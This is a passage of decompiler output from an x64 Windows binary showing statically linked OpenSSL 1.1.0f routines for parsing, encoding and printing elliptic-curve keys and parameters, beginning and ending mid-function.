    v3[6] = (__int64)v28;
    if ( !v28 )
    {
      sub_140024610(16, 263, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 763);
      v11 = 0i64;
      goto LABEL_22;
    }
    memmove(
      v28,
      *(const void **)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 16i64) + 8i64),
      **(int **)(*(_QWORD *)(a1 + 16) + 16i64));
    v3[7] = **(int **)(*(_QWORD *)(a1 + 16) + 16i64);
  }
  if ( !*(_QWORD *)(a1 + 32) || (v29 = *(_QWORD *)(a1 + 24)) == 0 || !*(_QWORD *)(v29 + 8) )
  {
    sub_140024610(16, 263, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 772);
    v11 = 0i64;
    goto LABEL_22;
  }
  v11 = sub_140022670(v3);
  if ( v11 )
  {
    sub_140021F30((__int64)v3, **(_BYTE **)(*(_QWORD *)(a1 + 24) + 8i64) & 0xFE);
    if ( !(unsigned int)sub_140028D30(v3, v11, *(_BYTE **)(*(_QWORD *)(a1 + 24) + 8i64), **(int **)(a1 + 24), 0i64) )
    {
      sub_140024610(16, 263, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 786);
      goto LABEL_22;
    }
    v30 = sub_14007DA80(*(_QWORD *)(a1 + 32), (__int64)v4);
    v4 = (_DWORD *)v30;
    if ( !v30 )
    {
      v35 = 792;
LABEL_75:
      v31 = 13;
LABEL_76:
      sub_140024610(16, 263, v31, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v35);
      goto LABEL_22;
    }
    if ( sub_1400270E0(v30) || sub_140027160((__int64)v4) )
    {
      v35 = 796;
      v31 = 122;
      goto LABEL_76;
    }
    if ( (int)sub_140027260((__int64)v4) > v14 + 1 )
    {
      sub_140024610(16, 263, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 800);
      goto LABEL_22;
    }
    v32 = *(_QWORD *)(a1 + 40);
    if ( v32 )
    {
      v5 = (_DWORD *)sub_14007DA80(v32, (__int64)v5);
      if ( !v5 )
      {
        v35 = 809;
        goto LABEL_75;
      }
    }
    else
    {
      sub_140026FF0(v5);
      v5 = 0i64;
    }
    if ( (unsigned int)sub_140021E30(v3, v11, (__int64)v4, (__int64)v5) )
      goto LABEL_23;
    sub_140024610(16, 263, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 814);
  }
LABEL_22:
  sub_140021350(v3);
  v3 = 0i64;
LABEL_23:
  sub_140026FF0(v2);
  sub_140026FF0(v4);
  sub_140026FF0(v5);
  sub_1400222C0(v11);
  return v3;
}

//----- (0000000140065F80) ----------------------------------------------------
__int64 *__fastcall sub_140065F80(int *a1)
{
  int v1; // eax
  int v3; // eax
  int v4; // eax
  __int64 v5; // rax
  __int64 v6; // rbx
  __int16 v7; // r8
  __int64 *v8; // rax
  __int64 *v9; // rbx
  int v10; // [rsp+20h] [rbp-18h]

  if ( !a1 )
  {
    sub_140024610(v1 - 40, 264, v1 + 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 839);
    return 0i64;
  }
  v3 = *a1;
  if ( !*a1 )
  {
    v4 = sub_14002C260(*((_QWORD *)a1 + 1));
    v5 = sub_140028760(v4);
    v6 = v5;
    if ( v5 )
    {
      sub_140021D70(v5, 1);
      return (__int64 *)v6;
    }
    v10 = 847;
    v7 = 119;
    goto LABEL_13;
  }
  if ( v3 == 1 )
  {
    v8 = sub_140065880(*((_QWORD *)a1 + 1));
    v9 = v8;
    if ( v8 )
    {
      sub_140021D70((__int64)v8, 0);
      return v9;
    }
    sub_140024610(16, 264, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 855);
  }
  else if ( v3 != 2 )
  {
    v10 = 862;
    v7 = 115;
LABEL_13:
    sub_140024610(16, 264, v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v10);
  }
  return 0i64;
}
// 140065FA6: variable 'v1' is possibly undefined

//----- (0000000140066080) ----------------------------------------------------
__int64 __fastcall sub_140066080(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1401060D0);
}

//----- (00000001400660A0) ----------------------------------------------------
__int64 *__fastcall sub_1400660A0(__int64 **a1, char **a2, __int64 a3)
{
  int *v5; // rax
  unsigned int *v6; // rsi
  __int64 *v8; // rbx
  char *v9; // [rsp+48h] [rbp+10h] BYREF

  v9 = *a2;
  v5 = (int *)sub_1400516D0(0i64, &v9, a3, (__int64)&unk_1401065E0);
  v6 = (unsigned int *)v5;
  if ( v5 )
  {
    v8 = sub_140065F80(v5);
    if ( v8 )
    {
      if ( a1 )
      {
        sub_140021350(*a1);
        *a1 = v8;
      }
      sub_140051250(v6, (__int64)&unk_1401065E0);
      *a2 = v9;
      return v8;
    }
    else
    {
      sub_140024610(16, 145, 127, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 884);
      sub_140051250(v6, (__int64)&unk_1401065E0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 145, 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 878);
    sub_140051250(0i64, (__int64)&unk_1401065E0);
    return 0i64;
  }
}

//----- (00000001400661B0) ----------------------------------------------------
__int64 __fastcall sub_1400661B0(__int64 *a1, char **a2, unsigned int a3)
{
  __int64 v6; // rbx

  if ( !a2 || !*a2 )
  {
    sub_140024610(16, 144, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1083);
    return 0i64;
  }
  if ( !a1 || (v6 = *a1) == 0 )
  {
    v6 = sub_14001C7F0();
    if ( !v6 )
    {
      sub_140024610(16, 144, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1089);
      return 0i64;
    }
  }
  if ( !sub_1400660A0((__int64 **)(v6 + 24), a2, a3) )
  {
    sub_140024610(16, 144, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1096);
    if ( !a1 || *a1 != v6 )
      sub_14001C600(v6);
    return 0i64;
  }
  if ( a1 )
    *a1 = v6;
  return v6;
}

//----- (00000001400662D0) ----------------------------------------------------
__int64 __fastcall sub_1400662D0(__int64 *a1, char **a2, __int64 a3)
{
  __int64 v5; // rsi
  __int64 v7; // rdi
  __int16 v8; // r8
  __FrameHandler3::TryBlockMap *v9; // rbp
  _QWORD *v10; // rax
  __FrameHandler3::TryBlockMap *v11; // rcx
  struct _xDISPATCHER_CONTEXT *v12; // rbx
  int v13; // eax
  unsigned int (__fastcall *v14)(__int64); // rax
  int v15; // [rsp+20h] [rbp-28h]
  char *v16; // [rsp+58h] [rbp+10h] BYREF

  v16 = *a2;
  v5 = sub_1400516D0(0i64, &v16, a3, (__int64)&unk_140106690);
  if ( !v5 )
  {
    sub_140024610(16, 146, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 925);
    return 0i64;
  }
  if ( !a1 || (v7 = *a1) == 0 )
  {
    v7 = sub_14001C7F0();
    if ( !v7 )
    {
      v15 = 931;
      v8 = 65;
LABEL_25:
      sub_140024610(16, 146, v8, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v15);
LABEL_26:
      if ( !a1 || *a1 != v7 )
        sub_14001C600(v7);
      sub_140051250((unsigned int *)v5, (__int64)&unk_140106690);
      return 0i64;
    }
  }
  if ( *(_QWORD *)(v5 + 16) )
  {
    sub_140021350(*(__int64 **)(v7 + 24));
    *(_QWORD *)(v7 + 24) = sub_140065F80(*(int **)(v5 + 16));
  }
  if ( !*(_QWORD *)(v7 + 24) )
  {
    sub_140024610(16, 146, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 943);
    goto LABEL_26;
  }
  *(_DWORD *)(v7 + 16) = *(_DWORD *)v5;
  v9 = *(__FrameHandler3::TryBlockMap **)(v5 + 8);
  if ( !v9 )
  {
    v15 = 955;
    v8 = 125;
    goto LABEL_25;
  }
  sub_14001D4F0(*(unsigned int **)(v5 + 8));
  __FrameHandler3::TryBlockMap::getpDC(v9);
  if ( !(unsigned int)sub_14001C920(v7) )
    goto LABEL_26;
  sub_140022090(*(void **)(v7 + 32));
  v10 = sub_140022670(*(__int64 **)(v7 + 24));
  *(_QWORD *)(v7 + 32) = v10;
  if ( !v10 )
  {
    sub_140024610(16, 146, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 962);
    goto LABEL_26;
  }
  v11 = *(__FrameHandler3::TryBlockMap **)(v5 + 24);
  if ( v11 )
  {
    v12 = __FrameHandler3::TryBlockMap::getpDC(v11);
    v13 = sub_14001D4F0(*(unsigned int **)(v5 + 24));
    if ( !(unsigned int)sub_14001C880(v7, v12, v13, 0i64) )
    {
      sub_140024610(16, 146, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 973);
      goto LABEL_26;
    }
  }
  else
  {
    v14 = *(unsigned int (__fastcall **)(__int64))(**(_QWORD **)(v7 + 24) + 352i64);
    if ( !v14 || !v14(v7) )
      goto LABEL_26;
    *(_DWORD *)(v7 + 48) |= 2u;
  }
  if ( a1 )
    *a1 = v7;
  sub_140051250((unsigned int *)v5, (__int64)&unk_140106690);
  *a2 = v16;
  return v7;
}
// 1400663C9: ignored the value written to the shadow area of the succeeding call

//----- (0000000140066500) ----------------------------------------------------
__int64 __fastcall sub_140066500(__int64 a1, __int64 *a2)
{
  unsigned int v2; // edi
  _DWORD *v5; // rbp
  void *v6; // r13
  _DWORD *v7; // r14
  __int64 v8; // rax
  size_t v9; // r12
  size_t v10; // r15
  int v11; // r12d
  _BYTE *v12; // rax
  __int16 v13; // r8
  char *v14; // rax
  int v15; // r15d
  _BYTE *v16; // rax
  _DWORD *v17; // rax
  int v19; // [rsp+20h] [rbp-58h]
  char *v20; // [rsp+30h] [rbp-48h]
  char v21; // [rsp+80h] [rbp+8h] BYREF
  void *v22; // [rsp+90h] [rbp+18h]
  char *v23; // [rsp+98h] [rbp+20h]

  v2 = 0;
  v22 = 0i64;
  v21 = 0;
  v5 = 0i64;
  v6 = 0i64;
  if ( a1 && a2 && *a2 && a2[1] )
  {
    v7 = sub_140027200();
    if ( !v7 || (v5 = sub_140027200()) == 0i64 )
    {
      v19 = 378;
      goto LABEL_38;
    }
    v8 = sub_140021BD0(a1);
    if ( (unsigned int)sub_140022000(v8) == 406 )
    {
      if ( !(unsigned int)sub_140021AB0(a1) )
      {
        sub_140024610(16, 153, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 387);
LABEL_40:
        sub_14001D930(v6);
        sub_14001D930(v22);
        sub_140026FF0(v7);
        sub_140026FF0(v5);
        return v2;
      }
    }
    else if ( !(unsigned int)sub_140021A60(a1) )
    {
      sub_140024610(16, 153, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 395);
      goto LABEL_40;
    }
    v9 = (int)(sub_140027260((__int64)v7) + 7) / 8;
    v10 = (int)(sub_140027260((__int64)v5) + 7) / 8;
    if ( v9 )
    {
      v12 = sub_14001D8E0(v9);
      v6 = v12;
      if ( !v12 )
      {
        v19 = 409;
LABEL_38:
        v13 = 65;
        goto LABEL_39;
      }
      v11 = sub_1400269C0((__int64)v7, v12);
      if ( !v11 )
      {
        v19 = 413;
        v13 = 3;
        goto LABEL_39;
      }
      v23 = (char *)v6;
    }
    else
    {
      v11 = 1;
      v23 = &v21;
    }
    if ( !v10 )
    {
      v14 = &v21;
      v15 = 1;
LABEL_26:
      v20 = v14;
      if ( !(unsigned int)sub_14006B0A0(*a2, v23, v11) || !(unsigned int)sub_14006B0A0(a2[1], v20, v15) )
      {
        v19 = 438;
        v13 = 13;
        goto LABEL_39;
      }
      if ( *(_QWORD *)(a1 + 48) )
      {
        if ( !a2[2] )
        {
          v17 = sub_14004FDA0();
          a2[2] = (__int64)v17;
          if ( !v17 )
          {
            v19 = 446;
            goto LABEL_38;
          }
        }
        *(_DWORD *)(a2[2] + 16) &= 0xFFFFFFF0;
        *(_DWORD *)(a2[2] + 16) |= 8u;
        if ( !(unsigned int)sub_14006B0A0(a2[2], *(_BYTE **)(a1 + 48), *(_DWORD *)(a1 + 56)) )
        {
          v19 = 453;
          v13 = 13;
          goto LABEL_39;
        }
      }
      else
      {
        sub_14004FD70(a2[2]);
        a2[2] = 0i64;
      }
      v2 = 1;
      goto LABEL_40;
    }
    v16 = sub_14001D8E0(v10);
    v22 = v16;
    if ( !v16 )
    {
      v19 = 425;
      goto LABEL_38;
    }
    v15 = sub_1400269C0((__int64)v5, v16);
    if ( v15 )
    {
      v14 = (char *)v22;
      goto LABEL_26;
    }
    v19 = 429;
    v13 = 3;
LABEL_39:
    sub_140024610(16, 153, v13, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v19);
    goto LABEL_40;
  }
  return 0i64;
}

//----- (0000000140066840) ----------------------------------------------------
__int64 __fastcall sub_140066840(_DWORD *a1, __int64 a2)
{
  unsigned int v2; // r12d
  _DWORD *v5; // rbp
  __int64 v6; // rax
  unsigned int v7; // edi
  char **v8; // rax
  _DWORD *v9; // rax
  _DWORD *v10; // rax
  _DWORD *v11; // rdi
  unsigned int v12; // eax
  unsigned int v13; // esi
  char **v14; // rax
  _DWORD *v15; // rax
  __int64 v16; // rax
  int v17; // esi
  int v18; // r14d
  int v19; // r15d
  _DWORD *v20; // rax
  __int64 v21; // rax
  int v23; // [rsp+60h] [rbp+8h] BYREF

  v2 = 0;
  v5 = 0i64;
  if ( a1 && a2 )
  {
    sub_14003F4D0(*(_QWORD *)a2);
    sub_14004FF20(*(unsigned int **)(a2 + 8));
    v6 = sub_140021BD0((__int64)a1);
    v7 = sub_140022000(v6);
    v8 = sub_14002C0F0(v7);
    *(_QWORD *)a2 = v8;
    if ( !v8 )
    {
      sub_140024610(16, 154, 8, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 258);
LABEL_40:
      sub_140026FF0(v5);
      return v2;
    }
    if ( v7 == 406 )
    {
      v5 = sub_140027200();
      if ( !v5 )
      {
        sub_140024610(16, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 264);
        goto LABEL_40;
      }
      if ( !(unsigned int)sub_140021AB0((__int64)a1) )
      {
        sub_140024610(16, 154, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 269);
        goto LABEL_40;
      }
      v9 = sub_14007DAA0((__int64)v5, 0i64);
      *(_QWORD *)(a2 + 8) = v9;
      if ( !v9 )
      {
        sub_140024610(16, 154, 13, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 275);
        goto LABEL_40;
      }
    }
    else
    {
      if ( v7 != 407 )
      {
        sub_140024610(16, 154, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 354);
        goto LABEL_40;
      }
      v10 = (_DWORD *)sub_140050B70((__int64)&unk_1401062C0);
      *(_QWORD *)(a2 + 8) = v10;
      v11 = v10;
      if ( !v10 )
      {
        sub_140024610(16, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 293);
        goto LABEL_40;
      }
      *v10 = sub_140021B10((__int64)a1);
      v12 = sub_140065450((__int64)a1);
      v13 = v12;
      if ( !v12 )
      {
        sub_140024610(16, 154, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 302);
        goto LABEL_40;
      }
      v14 = sub_14002C0F0(v12);
      *((_QWORD *)v11 + 1) = v14;
      if ( !v14 )
      {
        sub_140024610(16, 154, 8, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 307);
        goto LABEL_40;
      }
      if ( v13 == 682 )
      {
        if ( !(unsigned int)sub_1400657F0(a1, &v23) )
          goto LABEL_40;
        v15 = sub_14004FE60();
        *((_QWORD *)v11 + 2) = v15;
        if ( !v15 )
        {
          sub_140024610(16, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 319);
          goto LABEL_40;
        }
        if ( !(unsigned int)sub_14007DA60((__int64)v15, v23) )
        {
          sub_140024610(16, 154, 13, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 323);
          goto LABEL_40;
        }
      }
      else if ( v13 == 683 )
      {
        v16 = sub_140021BD0((__int64)a1);
        if ( (unsigned int)sub_140022000(v16) != 407
          || !a1[18]
          || (v17 = a1[19]) == 0
          || (v18 = a1[20]) == 0
          || (v19 = a1[21]) == 0
          || a1[22] )
        {
          sub_140024610(16, 193, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 73);
          goto LABEL_40;
        }
        v20 = (_DWORD *)sub_140050B70((__int64)&unk_140106160);
        *((_QWORD *)v11 + 2) = v20;
        if ( !v20 )
        {
          sub_140024610(16, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 334);
          goto LABEL_40;
        }
        *v20 = v19;
        *(_DWORD *)(*((_QWORD *)v11 + 2) + 4i64) = v18;
        *(_DWORD *)(*((_QWORD *)v11 + 2) + 8i64) = v17;
      }
      else
      {
        v21 = sub_14004FE90();
        *((_QWORD *)v11 + 2) = v21;
        if ( !v21 )
        {
          sub_140024610(16, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 347);
          goto LABEL_40;
        }
      }
    }
    v2 = 1;
    goto LABEL_40;
  }
  return 0i64;
}

//----- (0000000140066B30) ----------------------------------------------------
__int64 __fastcall sub_140066B30(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1401060D0);
}

//----- (0000000140066B50) ----------------------------------------------------
__int64 __fastcall sub_140066B50(__FrameHandler3::TryBlockMap *a1, unsigned __int8 **a2)
{
  unsigned int *v3; // rax
  unsigned int *v4; // rbx
  unsigned int v6; // edi

  v3 = (unsigned int *)sub_1400656F0(a1, 0i64);
  v4 = v3;
  if ( v3 )
  {
    v6 = sub_1400536F0(v3, a2, (__int64)&unk_1401065E0);
    if ( v6 )
    {
      sub_140051250(v4, (__int64)&unk_1401065E0);
      return v6;
    }
    else
    {
      sub_140024610(16, 191, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 908);
      sub_140051250(v4, (__int64)&unk_1401065E0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 191, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 904);
    return 0i64;
  }
}

//----- (0000000140066C20) ----------------------------------------------------
__int64 __fastcall sub_140066C20(__int64 a1, unsigned __int8 **a2)
{
  int v2; // eax

  if ( a1 )
    return sub_140066B50(*(__FrameHandler3::TryBlockMap **)(a1 + 24), a2);
  sub_140024610(v2 - 40, 190, v2 + 11, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1072);
  return 0i64;
}
// 140066C4A: variable 'v2' is possibly undefined

//----- (0000000140066C70) ----------------------------------------------------
__int64 __fastcall sub_140066C70(__int64 a1, unsigned __int8 **a2)
{
  unsigned int v2; // esi
  unsigned int v5; // r14d
  int v6; // r12d
  __int64 v7; // rbp
  __int64 v8; // rdi
  __int16 v9; // r8
  __int64 v10; // rax
  bool v11; // zf
  __int64 v12; // rax
  _DWORD *v13; // rax
  __int64 v14; // rax
  int v16; // [rsp+20h] [rbp-38h]
  void *v17; // [rsp+60h] [rbp+8h] BYREF
  void *v18; // [rsp+70h] [rbp+18h] BYREF

  v2 = 0;
  v17 = 0i64;
  v18 = 0i64;
  v5 = 0;
  v6 = 0;
  v7 = 0i64;
  v8 = 0i64;
  if ( !a1 || !*(_QWORD *)(a1 + 24) || (*(_BYTE *)(a1 + 48) & 2) == 0 && !*(_QWORD *)(a1 + 32) )
  {
    v16 = 1007;
    v9 = 67;
    goto LABEL_22;
  }
  v8 = sub_140050B70((__int64)&unk_140106690);
  if ( !v8 )
  {
    v16 = 1012;
    v9 = 65;
LABEL_22:
    sub_140024610(16, 192, v9, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v16);
    goto LABEL_23;
  }
  *(_DWORD *)v8 = *(_DWORD *)(a1 + 16);
  v10 = sub_14001C980(a1, &v17);
  v7 = v10;
  if ( !v10 )
  {
    sub_140024610(16, 192, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1021);
    goto LABEL_23;
  }
  sub_1400476D0(*(_QWORD *)(v8 + 8), (__int64)v17, v10);
  v11 = (*(_BYTE *)(a1 + 48) & 1) == 0;
  v17 = 0i64;
  if ( v11 )
  {
    v12 = sub_1400656F0(*(__FrameHandler3::TryBlockMap **)(a1 + 24), *(_QWORD *)(v8 + 16));
    *(_QWORD *)(v8 + 16) = v12;
    if ( !v12 )
    {
      sub_140024610(16, 192, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1032);
      goto LABEL_23;
    }
  }
  if ( (*(_BYTE *)(a1 + 48) & 2) == 0 )
  {
    v13 = sub_14004FDA0();
    *(_QWORD *)(v8 + 24) = v13;
    if ( !v13 )
    {
      v16 = 1040;
      v9 = 65;
      goto LABEL_22;
    }
    v14 = sub_14001C7A0(a1, *(_DWORD *)(a1 + 52), &v18, 0i64);
    if ( !v14 )
    {
      sub_140024610(16, 192, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1047);
      goto LABEL_23;
    }
    *(_DWORD *)(*(_QWORD *)(v8 + 24) + 16i64) &= 0xFFFFFFF0;
    *(_DWORD *)(*(_QWORD *)(v8 + 24) + 16i64) |= 8u;
    sub_1400476D0(*(_QWORD *)(v8 + 24), (__int64)v18, v14);
    v18 = 0i64;
  }
  v5 = sub_1400536F0((unsigned int *)v8, a2, (__int64)&unk_140106690);
  if ( v5 )
    v6 = 1;
  else
    sub_140024610(16, 192, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1058);
LABEL_23:
  sub_14001DA40(v17, v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 0x427u);
  sub_14001D930(v18);
  sub_140051250((unsigned int *)v8, (__int64)&unk_140106690);
  if ( v6 )
    return v5;
  return v2;
}

//----- (0000000140066EA0) ----------------------------------------------------
__int64 __fastcall sub_140066EA0(__int64 a1, void **a2)
{
  int v2; // eax
  int v5; // ebp
  __int64 result; // rax
  unsigned __int64 v7; // rdi
  void *v8; // rax

  v5 = 0;
  if ( !a1 )
  {
    sub_140024610(v2 - 32, v2 + 103, v2 + 19, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1134);
    return 0i64;
  }
  result = sub_140028EA0(*(_QWORD *)(a1 + 24), *(_QWORD **)(a1 + 32), *(_DWORD *)(a1 + 52), 0i64, 0i64, 0i64);
  v7 = result;
  if ( a2 && result )
  {
    if ( !*a2 )
    {
      v8 = sub_14001D8E0(result);
      *a2 = v8;
      if ( !v8 )
      {
        sub_140024610(16, 151, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1147);
        return 0i64;
      }
      v5 = 1;
    }
    if ( sub_140028EA0(*(_QWORD *)(a1 + 24), *(_QWORD **)(a1 + 32), *(_DWORD *)(a1 + 52), *a2, v7, 0i64) )
    {
      if ( !v5 )
        *a2 = (char *)*a2 + v7;
      return (unsigned int)v7;
    }
    else
    {
      sub_140024610(16, 151, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1154);
      if ( v5 )
      {
        sub_14001D930(*a2);
        *a2 = 0i64;
      }
      return 0i64;
    }
  }
  return result;
}
// 140066EE1: variable 'v2' is possibly undefined

//----- (0000000140067000) ----------------------------------------------------
__int64 __fastcall sub_140067000(__int64 *a1, _BYTE **a2, int a3)
{
  __int64 v4; // rbx
  __int64 v5; // rsi

  if ( a1 && (v4 = *a1) != 0 && *(_QWORD *)(v4 + 24) )
  {
    v5 = a3;
    if ( (unsigned int)sub_14001C880(v4, *a2, a3, 0i64) )
    {
      *a2 += v5;
      return v4;
    }
    else
    {
      sub_140024610(16, 152, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1121);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 152, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1116);
    return 0i64;
  }
}

//----- (00000001400670C0) ----------------------------------------------------
__int64 __fastcall sub_1400670C0(__int64 a1, const char *a2, __int64 a3, __int64 a4, int a5)
{
  unsigned int v5; // edi
  __int64 result; // rax
  char *v10; // rbx
  char *v11; // r15
  size_t v12; // r13
  _BYTE *v13; // rax
  __int64 v14; // r14
  int v15; // eax
  int v16; // [rsp+20h] [rbp-48h]
  int v17; // [rsp+30h] [rbp-38h]
  void *v18; // [rsp+80h] [rbp+18h]

  v5 = 0;
  if ( !a3 )
    return 1i64;
  v10 = byte_1400D7DAE;
  v11 = byte_1400D7DAE;
  if ( sub_1400270E0(a3) )
    v11 = "-";
  result = sub_140029E80(a1, a5, 128);
  if ( (_DWORD)result )
  {
    if ( sub_140027160(a3) )
    {
      LOBYTE(v5) = (int)sub_14002A590(a1, "%s 0\n", a2) > 0;
    }
    else if ( (int)(sub_140027260(a3) + 7) >= 72 )
    {
      v12 = (int)(sub_140027260(a3) + 7) / 8 + 1;
      v13 = sub_14001D8E0(v12);
      v18 = v13;
      v14 = (__int64)v13;
      if ( v13 )
      {
        *v13 = 0;
        if ( *v11 == 45 )
          v10 = " (Negative)";
        if ( (int)sub_14002A590(a1, "%s%s\n", a2, v10) > 0 )
        {
          v15 = sub_1400269C0(a3, (_BYTE *)(v14 + 1));
          if ( *(char *)(v14 + 1) >= 0 )
            ++v14;
          else
            ++v15;
          if ( (unsigned int)sub_1400672A0(a1, v14, v15, a5 + 4) )
            v5 = 1;
        }
      }
      sub_14001DA40(v18, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\t_pkey.c", 0x5Bu);
    }
    else
    {
      v17 = *(_DWORD *)sub_140021BD0(a3);
      v16 = *(_DWORD *)sub_140021BD0(a3);
      LOBYTE(v5) = (int)sub_14002A590(a1, "%s %s%lu (%s0x%lx)\n", a2, v11, v16, v11, v17) > 0;
    }
    return v5;
  }
  return result;
}

//----- (00000001400672A0) ----------------------------------------------------
__int64 __fastcall sub_1400672A0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  unsigned int v4; // ebp
  unsigned __int64 v9; // rbx
  __int16 *v10; // r9

  v4 = 0;
  v9 = 0i64;
  if ( a3 )
  {
    while ( v9 != 15 * (v9 / 0xF)
         || (!v9 || (int)sub_14002A1A0(a1, (__int64)"\n") > 0) && (unsigned int)sub_140029E80(a1, a4, 128) )
    {
      v10 = word_1400F6B40;
      if ( v9 == a3 - 1 )
        v10 = (__int16 *)byte_1400D7DAE;
      if ( (int)sub_14002A590(a1, "%02x%s", *(unsigned __int8 *)(v9 + a2), v10) <= 0 )
        break;
      if ( ++v9 >= a3 )
        goto LABEL_10;
    }
    return 0i64;
  }
  else
  {
LABEL_10:
    LOBYTE(v4) = (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0;
    return v4;
  }
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400673B0) ----------------------------------------------------
void *sub_1400673B0()
{
  return &unk_140106940;
}

//----- (00000001400673C0) ----------------------------------------------------
void __fastcall sub_1400673C0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140106940);
}

//----- (00000001400673E0) ----------------------------------------------------
void __fastcall sub_1400673E0(_QWORD *a1, _DWORD *a2, _QWORD *a3, _QWORD *a4)
{
  _DWORD *v4; // rax

  if ( a1 )
    *a1 = *a4;
  if ( a2 )
  {
    v4 = (_DWORD *)a4[1];
    if ( v4 )
    {
      *a2 = *v4;
      if ( a3 )
        *a3 = *(_QWORD *)(a4[1] + 8i64);
    }
    else
    {
      *a2 = -1;
    }
  }
}

//----- (0000000140067420) ----------------------------------------------------
__int64 sub_140067420()
{
  return sub_140050B70((__int64)&unk_140106940);
}

//----- (0000000140067440) ----------------------------------------------------
__int64 __fastcall sub_140067440(__int64 *a1, __int64 a2, int a3, __int64 a4)
{
  unsigned int *v9; // rcx

  if ( !a1 )
    return 0i64;
  if ( a3 != -1 )
  {
    if ( !a1[1] )
      a1[1] = sub_14004FF40();
    if ( !a1[1] )
      return 0i64;
  }
  sub_14003F4D0(*a1);
  *a1 = a2;
  if ( a3 )
  {
    v9 = (unsigned int *)a1[1];
    if ( a3 == -1 )
    {
      sub_14004FF20(v9);
      a1[1] = 0i64;
    }
    else
    {
      sub_14003F350((__int64)v9, a3, a4);
    }
  }
  return 1i64;
}

//----- (00000001400674E0) ----------------------------------------------------
__int64 __fastcall sub_1400674E0(__int64 *a1, __int64 a2)
{
  int v3; // ebx
  unsigned int v4; // eax
  char **v5; // rax

  v3 = -1;
  if ( (*(_BYTE *)(a2 + 12) & 8) == 0 )
    v3 = 5;
  v4 = sub_14001D4F0((unsigned int *)a2);
  v5 = sub_14002C0F0(v4);
